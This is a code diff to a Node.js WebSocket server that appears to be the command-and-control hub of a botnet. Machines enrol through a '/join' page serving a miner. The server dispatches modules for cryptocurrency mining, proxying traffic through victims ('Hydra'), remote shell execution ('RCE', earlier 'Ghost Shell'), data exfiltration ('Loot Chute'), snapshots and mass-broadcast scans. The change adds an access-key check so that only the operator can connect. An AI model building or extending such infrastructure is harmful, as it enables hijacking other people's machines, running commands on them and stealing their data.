@@ -6,8 +6,16 @@ const path = require('path');
 
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
+const SECRET_KEY = process.env.ACCESS_KEY; // The Vault Key
 
-// --- ADVANCED STATE ---
+// SECURITY CHECK
+if (!SECRET_KEY) {
+    console.error("FATAL ERROR: No ACCESS_KEY found in Environment Variables.");
+    console.error("Go to Render Dashboard -> Environment -> Add ACCESS_KEY");
+    process.exit(1);
+}
+
+// --- STATE MANAGEMENT ---
 let workers = new Map(); // Key: WebSocket | Value: { id, ip, role, lastSeen }
 let clients = new Set(); // Dashboards
 
@@ -32,6 +40,18 @@ app.get('/join', (req, res) => res.sendFile(path.join(__dirname, 'miner.html')))
 // --- WEBSOCKET LOGIC ---
 wss.on('connection', (ws, req) => {
     
+    // 1. SECURITY HANDSHAKE
+    // We expect the URL to be: wss://...?key=YOUR_SECRET_KEY
+    const urlParams = new URLSearchParams(req.url.replace('/',''));
+    const providedKey = urlParams.get('key');
+
+    if (providedKey !== SECRET_KEY) {
+        console.log(`[SECURITY] Blocked unauthorized connection from ${req.socket.remoteAddress}`);
+        ws.close();
+        return;
+    }
+
+    // 2. ASSIGN IDENTITY
     const id = generateId();
     const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';
@@ -58,7 +78,7 @@ function handleMessage(ws, data) {
 
     switch (data.type) {
 
-        // 1. REGISTRATION
+        // --- REGISTRATION ---
         case 'REGISTER_WORKER':
             if (worker) { worker.role = 'MINING'; worker.type = 'NODE'; }
             sendJob(ws);
@@ -71,16 +91,18 @@ function handleMessage(ws, data) {
             broadcastStats();
             break;
 
-        // 2. MINING
+        // --- MODULE 1: MINING ---
         case 'JOB_COMPLETE':
             totalHashes += RANGE_SIZE;
-            if (worker) worker.role = 'MINING';
+            if (worker) worker.role = 'IDLE'; // Wait for next command
             if (data.solution) foundGoldenTicket = data.solution;
+            
+            // In "Eternal Mode", we just keep sending jobs if no ticket found
             if (!foundGoldenTicket) sendJob(ws);
             broadcastStats();
             break;
 
-        // 3. PROXY (The Hydra)
+        // --- MODULE 2: PROXY (HYDRA) ---
         case 'SEND_PROXY_CMD':
             const proxyWorkers = Array.from(workers.keys());
             if (proxyWorkers.length > 0) {
@@ -97,12 +119,12 @@ function handleMessage(ws, data) {
             clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
             if (worker) {
                 setTimeout(() => { 
-                    if (workers.has(ws)) { worker.role = 'MINING'; broadcastStats(); }
+                    if (workers.has(ws)) { worker.role = 'IDLE'; broadcastStats(); }
                 }, 1000);
             }
             break;
 
-        // 4. SHELL (Ghost Shell)
+        // --- MODULE 3: SHELL (RCE) ---
         case 'SEND_SHELL_CMD':
             const shellWorkers = Array.from(workers.keys());
             if (shellWorkers.length > 0) {
@@ -114,7 +136,7 @@ function handleMessage(ws, data) {
              clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
              break;
 
-        // 5. EXFILTRATION (Loot Chute)
+        // --- MODULE 4: EXFILTRATION ---
         case 'SEND_EXFIL_CMD':
              const exfilWorkers = Array.from(workers.keys());
              if (exfilWorkers.length > 0) {
@@ -130,18 +152,31 @@ function handleMessage(ws, data) {
              })));
              break;
 
-        // 6. SNAPSHOT (Ghost Eye / Twitter Scraper)
+        // --- MODULE 5: SNAPSHOT ---
         case 'SEND_SNAPSHOT_CMD':
              const camWorkers = Array.from(workers.keys());
              if (camWorkers.length > 0) {
                  camWorkers[0].send(JSON.stringify({ type: 'SNAPSHOT_CMD', url: data.url }));
              }
              break;
+
+        // --- MODULE 6: ALPHA SNIPER ---
+        case 'SEND_SNIPE_CMD':
+             // Broadcast to ALL workers (Massive Parallel Scan)
+             workers.forEach((meta, workerWs) => {
+                 workerWs.send(JSON.stringify({ type: 'SNIPE_CMD', ticker: data.ticker }));
+             });
+             break;
+
+        case 'SNIPE_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'SNIPE_LOG', data: data })));
+             break;
     }
 }
 
 function sendJob(ws) {
     if (foundGoldenTicket) {
+        // We do NOT stop the worker anymore. We just stop mining.
         ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
         return;
     }
